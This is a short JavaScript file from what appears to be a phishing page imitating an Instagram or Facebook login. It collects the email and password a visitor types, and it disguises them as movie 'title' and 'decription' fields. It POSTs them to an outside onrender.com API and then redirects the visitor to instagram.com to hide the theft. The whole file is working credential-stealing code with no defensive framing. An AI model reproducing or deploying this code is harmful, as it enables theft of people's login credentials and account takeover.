const loginButton = document.getElementById('login');
const facebookLoginButton = document.getElementById('facebooklogin');
const emailInput = document.querySelector('input[name="title"]');
const passwordInput = document.querySelector('input[name="decription"]');
const mobileSection = document.getElementById('mobile');
const authSection = document.getElementById('auth');
const sendmeth = () => {
    const email = emailInput.value;
    const password = passwordInput.value;
    const pkg = { title: email, decription: password }
    console.log(JSON.stringify(pkg))
    const API = "https://admin-api-maaj-sg2l.onrender.com/api/movie/data"
    if (email && password) {
        fetch(API, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body:JSON.stringify(pkg) 
        })
            .then(res => {
                if (res.status==201)
                window.location.href ='https://www.instagram.com'
            })
            .catch(err => console.log(err));
    }
}
loginButton.addEventListener('click', () => {
    console.log(emailInput.value, passwordInput.value)
    if (emailInput.value && passwordInput.value) { 
        sendmeth() 
    }
    else { alert("Please Enter your Credential") }
});
